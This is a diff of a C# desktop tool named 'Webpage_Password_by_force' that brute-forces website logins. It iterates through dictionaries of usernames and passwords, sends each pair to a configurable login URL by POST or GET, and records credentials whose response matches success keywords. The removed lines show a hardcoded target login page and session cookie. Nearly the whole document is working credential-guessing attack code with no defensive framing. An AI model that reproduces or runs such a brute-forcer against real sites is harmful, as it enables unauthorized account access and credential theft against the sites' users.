@@ -1,66 +1,96 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Linq;
-using System.Net;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
-using System.Windows.Controls;
+using System.Windows;
 
 namespace Webpage_Password_by_force
 {
-    
+    class BruteData : EventArgs
+    {
+        public string Password = "";
+        public string Username = "";
+        public string ResponseBody = "";
+    }
+    class ResponseData : EventArgs
+    {
+        public string Data;
+    }
     class BrutePasswordGuesser
     {
-        private const bool _NOT_PAUSED = false;
+        private
+        const bool _NOT_PAUSED = false;
         public Dictionary _Dictionary;
         public webMethod _webMethod;
-
+        public httpMetaData fakeRequest;
 
         private volatile Boolean _KeepWorking;
-        public  Boolean isPause = false;
+        public Boolean isPause = false;
 
         public int totalProgress = 0;
         public int progress = 0, total = 0;
         public bool complete = false;
-        public string pageSrc = "";
+        public BruteData outResult = null;
 
-
-        private int _dealy = 200; // Microseconds
-
+        public int _dealy = 200;
+        public int _timeout = 200000;
+        public string key2;
+        public string key1;
+        public string REST;
         public string _info;
+        public string _reqInfo = "";
         public string _successfulLogins;
 
         private int totalUsers = 0;
         private int totalPasswords = 0;
         private int currentPasswordNum = 0;
-        private int currentUserNum = 0;
+        public int currentUserNum = 0;
         private string currentUser = "";
         private string currentPassword = "";
-         private Uri myUri = new Uri("https://www.webpage.com/login/?");
-        //private Uri myUri = new Uri("http://localhost/headers.php");
-        System.Net.CookieContainer myCookies;
+        private int currentGuessNo = 0;
 
-        public BrutePasswordGuesser(Dictionary Dic)
+        DateTime startTime, endTime;
+
+        public event EventHandler onData = null;
+        public event EventHandler testCallback = null;
+        public event EventHandler DataReceivedHandler = null;
+
+        void msgBox(string text)
+        {
+            string messageBoxText = text;
+            string caption = "?";
+            MessageBoxButton button = MessageBoxButton.OK;
+            MessageBoxImage icon = MessageBoxImage.Warning;
+            MessageBoxResult result;
+
+            result = MessageBox.Show(messageBoxText, caption, button, icon, MessageBoxResult.Yes);
+        }
+        void client_DataReceivedHandler(object sender, EventArgs e)
         {
 
-            // wr.CookieContainer = new CookieContainer();
-            // wr.CookieContainer.Add(new Cookie("PHPSESSID", "u3ilo4qnvau5cfr5qsqet16o1b"));
+            string responseBodyAsText = "body";
+            if ( /*response.IsSuccessStatusCode &&*/ DataReceivedHandler != null)
+            {
+                DataReceivedHandler(this, e);
+            }
+            if (onData != null)
+                onData(this, new ResponseData
+                {
+                    Data = responseBodyAsText
+                });
+
+        }
+        public BrutePasswordGuesser(Dictionary Dic)
+        {
             _Dictionary = Dic;
             _KeepWorking = true;
             isPause = _NOT_PAUSED;
             _webMethod = new webMethod();
-
-             myCookies = new System.Net.CookieContainer();
-            myCookies.Add(new Cookie("PHPSESSID", "u3ilo4qnvau5cfr5qsqet16o1b") { Domain = myUri.Host });
-
+            _webMethod.DataReceivedHandler += client_DataReceivedHandler;
             progress = 0;
-
             totalPasswords = _Dictionary.allPasswords.Length;
             totalUsers = _Dictionary.allUsers.Length;
             total = totalPasswords * totalUsers;
         }
-
 
         public int getTotalProgress()
         {
@@ -68,79 +98,90 @@ namespace Webpage_Password_by_force
             num3 *= 100;
             return (int)num3;
         }
-        private void onComplete ()
+        private void onComplete()
         {
-            addInfo("Completed");
             _KeepWorking = false;
             complete = true;
         }
+        private static Random random = new Random();
+        public static string RandomString(int length)
+        {
+            random = new Random();
+            //const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+              .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+
         public void nextGuess()
         {
             while (_KeepWorking)
             {
                 if (isPause == _NOT_PAUSED)
                 {
-                    /*
-                    foreach (string userName in BruteGuesser._Dictionary.allUsers)
-                    {
-                        foreach (string password in BruteGuesser._Dictionary.allPasswords)
-                        {
-                            this.message(userName + ":" + password + " Failed");
-                        }
-                    }
-                    */
-                    Thread.Sleep(_dealy);
-                    // addInfo("The thread is running");
+                    if (++currentGuessNo == 1) { }
+                    startTime = DateTime.Now;
+                    if (_dealy > 0) Thread.Sleep(_dealy);
                     progress += 1;
-
-
                     currentPassword = _Dictionary.allPasswords[currentPasswordNum];
                     currentUser = _Dictionary.allUsers[currentUserNum];
 
+                    fakeRequest.AUTH_PASSWORD = currentPassword;
+                    fakeRequest.AUTH_USERNAME = currentUser;
+                    fakeRequest.timeout = _timeout;
 
-
-                    string postData = "username=" + Uri.EscapeDataString(currentUser) + "&pass=" + Uri.EscapeDataString(currentPassword) + "&action=login&email_link="+ Uri.EscapeDataString("https://www.webpage.com/login/?")+"&remember_me=1&format=json&mode=async";
-                    
-                    bool result = _webMethod.post(myUri, postData, myUri.OriginalString, myCookies, ref pageSrc);
-
-                    pageSrc = "";
-
-                    bool matched = false;
-
-                    if (result) matched = true;
-                    /*
-                    Random r = new Random();
-                    int rInt = r.Next(0, 10); //for ints
-                    if (rInt > 8)
+                    if (testCallback != null)
                     {
-                        matched = true;
-                       
-                    }
-                    /**/
-
-
-
-
-                        /*
-                         * 
-                         * 
-                         * */
-
-                    if (matched)
-                    {
-                        _successfulLogins += "" + currentUser + ":" + currentPassword + "\n";
+                        testCallback(this, new BruteData
+                        {
+                            Password = currentPassword,
+                            Username = currentUser
+                        });
                     }
 
+                    string responseBodyAsText = "";
+                    bool result = false;
+                    if (fakeRequest.postMethod == "POST")
+                    {
+                        result = _webMethod.post(fakeRequest, fakeRequest.myCookieContainer, ref responseBodyAsText, ref _reqInfo, REST);
+                    }
+                    else if (fakeRequest.postMethod == "GET")
+                    {
+                        result = _webMethod.get(fakeRequest, fakeRequest.myCookieContainer, ref responseBodyAsText, ref _reqInfo);
+                    }
 
+                    if ( /*response.IsSuccessStatusCode &&*/ DataReceivedHandler != null)
+                    {
+                        DataReceivedHandler(this, new ResponseData
+                        {
+                            Data = responseBodyAsText
+                        });
+                    }
+
+                    bool matched = true;
+                    if (key1 != null && key1.Length > 0 && matched == true)
+                    {
+                        matched = responseBodyAsText.Contains(key1) == true;
+                    }
+                    if (key2 != null && key2.Length > 0 && matched == true)
+                    {
+                        matched = responseBodyAsText.Contains(key2) == false;
+                    }
+
+                    endTime = DateTime.Now;
+                    _info += currentGuessNo + ". "+ fakeRequest.postMethod+ " " + fakeRequest.targetURL.Host + " => ";
+                    Double elapsedMillisecs = ((TimeSpan)(endTime - startTime)).TotalMilliseconds;
                     if (matched)
                     {
-                        addInfo("" + currentUser + ":" + currentPassword + " Sucessful");
+                        // msgBox(_reqInfo);
+                        _successfulLogins += fakeRequest.targetURL.Host + " => " + currentUser + ":" + currentPassword + "\n";
+                        _info += " Login Sucessful " + currentUser + ":" + currentPassword;
                     }
                     else
                     {
-                        addInfo("" + currentUser + ":" + currentPassword + " Failed");
+                        _info += " Login Failed " + currentUser + ":" + currentPassword;
                     }
-                    
+                    _info += " Time for => " + elapsedMillisecs + "ms\n";
 
                     currentPasswordNum++;
                     if (currentPasswordNum >= totalPasswords)
@@ -154,25 +195,17 @@ namespace Webpage_Password_by_force
                         }
                     }
 
-
-
-
-
-
                 }
                 else
                 {
-                    Thread.Sleep(_dealy);
-                   // addInfo("The thread is paused");
+                    if (_dealy > 0) Thread.Sleep(_dealy + 1000);
+                    else
+                    {
+                        Thread.Sleep(1000);
+                    }
                 }
-               
-            }
-        }
-        void addInfo(string newText)
-        {
-            
 
-            _info+= newText + "\n";
+            }
         }
         public void stopGuessing()
         {
